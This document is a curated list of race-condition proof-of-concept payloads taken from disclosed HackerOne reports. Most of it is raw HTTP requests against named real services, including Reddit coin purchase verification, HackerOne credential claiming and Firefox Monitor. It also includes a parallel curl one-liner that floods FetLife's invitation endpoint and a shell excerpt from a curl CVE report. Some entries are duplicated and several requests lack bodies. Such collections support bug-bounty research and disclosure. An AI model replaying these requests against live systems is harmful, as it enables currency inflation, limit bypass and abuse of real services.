# Race Conditions & TOCTOU  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#488985](https://hackerone.com/reports/488985)  -  Race condition in claiming program credentials
*low*

```http
POST /graphql HTTP/1.1
Host: hackerone.com
Content-Length: 778
Origin: https://hackerone.com
Content-Type: application/json
Referer: https://hackerone.com/█████
Cookie: __cfduid=███████; _cfuid=███████; _ga=████; _mkto_trk=id:████████

{"query":"mutation Claim_credential_mutation($input_0:ClaimCredentialInput!,$types_1:[ErrorTypeEnum]!,$first_2:Int!) {claimCredential(input:$input_0) {clientMutationId,...F4,...F5}} fragment F0 on Team {id,claimed_credential {credentials,account_details,id}} fragment F1 on Node {id} fragment F2 on ResourceInterface {...F0,...F1} fragment F3 on Team {id} fragment F4 on ClaimCredentialPayload {team {id,...F2,...F3}} fragment F5 on ClaimCredentialPayload {team {claimed_credential {id},id},was_successful,_errors4fkckF:errors(types:$types_1,first:$first_2) {edges {node {type,field,message,id},cursor},pageInfo {hasNextPage,hasPreviousPage}}}","variables":{"input_0":{"team_id":"█████=","clientMutationId":"1"},"types_1":"ARGUMENT","first_2":100}}
```

## 2. [#1132171](https://hackerone.com/reports/1132171)  -  Race condition allows to send multiple times feedback for the hacker
*low*

```http
POST /hacker_reviews HTTP/1.1
Host: hackerone.com
X-CSRF-Token: $token
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 112
Origin: https://hackerone.com
Cookie: $cookies

hacker_username=kijkijkoijkijkijkijkijki&report_id=1132085&positive=false&behavior=rude&private_feedback=Testing
```

## 3. [#994051](https://hackerone.com/reports/994051)  -  Race condition on my.stripo.email at /cabinet/stripeapi/v1/projects/298427/emails/folders uri
*medium*

```http
POST /cabinet/stripeapi/v1/projects/298427/emails/folders HTTP/1.1
Host: my.stripo.email
Content-Length: 23
Content-Type: application/json;charset=UTF-8
Origin: https://my.stripo.email
```

## 4. [#1913309](https://hackerone.com/reports/1913309)  -  Race condition leads to add more than 5 email at Data breaches monitor system at https://stage.firefoxmonitor.nonprod.cloudops.mozgcp.net
*low*

```http
POST /api/v1/user/email HTTP/2
Host: stage.firefoxmonitor.nonprod.cloudops.mozgcp.net
Cookie: connect.sid=█████; _ga_CXG8K4KW4P=GS1.1.1679333065.1.1.1679336292.0.0.0; _ga=GA1.1.518394987.1679333065
Referer: https://stage.firefoxmonitor.nonprod.cloudops.mozgcp.net/user/settings
Content-Type: application/json
X-Csrf-Token: 0787d9f55701a244aa8f68401f2dc6aebb55a1b83ee2930743ba1324314b5c2cb87fafa7bac74afd8d4660feff2ce33d5b38fb949478c5b9f32430e863ced6b4
Content-Length: 33
Origin: https://stage.firefoxmonitor.nonprod.cloudops.mozgcp.net

{"email":"████████"}
```

## 5. [#801743](https://hackerone.com/reports/801743)  -  Race condition leads to Inflation of coins when bought via Google Play Store at endpoint https://oauth.reddit.com/api/v2/gold/android/verify_purchase
*medium*

```http
POST /api/v2/gold/android/verify_purchase?raw_json=1&feature=link_preview&sr_detail=true&expand_srs=true&from_detail=true&api_type=json&raw_json=1&always_show_media=1&request_timestamp=1582296187715 HTTP/1.1
Authorization: Bearer REDACTED
Content-Type: application/x-www-form-urlencoded
Content-Length: 327
Host: oauth.reddit.com

transaction_id=GPA.3390-9967-2355-57063&token=effmpcoplmjonhljkheipnce.AO-J1OyQ3ZXb7XM7JwoJPJqpNP3LgWYqHYUUmOE7o5hCzQtf4TC8GL0i71zvRVeZKl-I5rlQCfM0ID3Z0P8CTFSUmhbdbPvQwOIN0164LBE647_lDvB9aHzk2naeC59hSFrtJJYkYj2b&package_name=com.reddit.frontpage&product_id=com.reddit.coins_1&correlation_id=394e65c9-5f9d-45e7-a9b4-498ed64251cd
```

## 6. [#604534](https://hackerone.com/reports/604534)  -  Race Condition leads to undeletable group member
*low*

```http
POST /group/post_join HTTP/1.1
Host: ctf.hacker101.com
Referer: https://ctf.hacker101.com/group/join?invite=bb5c42ab578b12c63e5d868b3e03816c8c45597262aaf095ca2be19116b8fd0a
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
Cookie: COOKIES

csrf=391aecf0c3125e90c437d04c18204ab6&invite=bb5c42ab578b12c63e5d868b3e03816c8c45597262aaf095ca2be19116b8fd0a
```

## 7. [#1132171](https://hackerone.com/reports/1132171)  -  Race condition allows to send multiple times feedback for the hacker
*low*

```http
POST /hacker_reviews HTTP/1.1
Host: hackerone.com
X-CSRF-Token: $token
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 112
Origin: https://hackerone.com
```

## 8. [#1438052](https://hackerone.com/reports/1438052)  -  Race condition in faucet when using starport
*critical, $5,000*

```http
POST / HTTP/1.1
Host: 172.105.41.242:4500
Referer: http://172.105.41.242:4500/
Content-Type: application/json
Origin: http://172.105.41.242:4500
Content-Length: 63
```

## 9. [#801743](https://hackerone.com/reports/801743)  -  Race condition leads to Inflation of coins when bought via Google Play Store at endpoint https://oauth.reddit.com/api/v2/gold/android/verify_purchase
*medium*

```http
POST /api/v2/gold/android/verify_purchase?raw_json=1&feature=link_preview&sr_detail=true&expand_srs=true&from_detail=true&api_type=json&raw_json=1&always_show_media=1&request_timestamp=1582296187715 HTTP/1.1
Authorization: Bearer REDACTED
Content-Type: application/x-www-form-urlencoded
Content-Length: 327
Host: oauth.reddit.com
```

## 10. [#1460373](https://hackerone.com/reports/1460373)  -  Race condition in endpoint POST fetlife.com/users/invitation, allow attacker to generate unlimited invites
*medium*

```bash
curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_1}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_2}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_3}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_4}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_5}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_6}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_7}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_8}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_9}' & curl 'https://fetlife.com/users/invitation' -H 'User-Agent: cur1' -H 'Cookie: _fl_sessionid={session_id}' --data 'authenticity_token={authenticity_token}&user%5Bemail%5D={email_address_10}'
# … truncated …
```

## 11. [#2078571](https://hackerone.com/reports/2078571)  -  [curl] CVE-2023-32001: fopen race condition
*medium, $2,480*

```
...
-rw-r--r-- 1 root    root      131 Jun 27 07:13 flag
...
root@deb:/home/selmelc/Documents# cat flag
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.
```
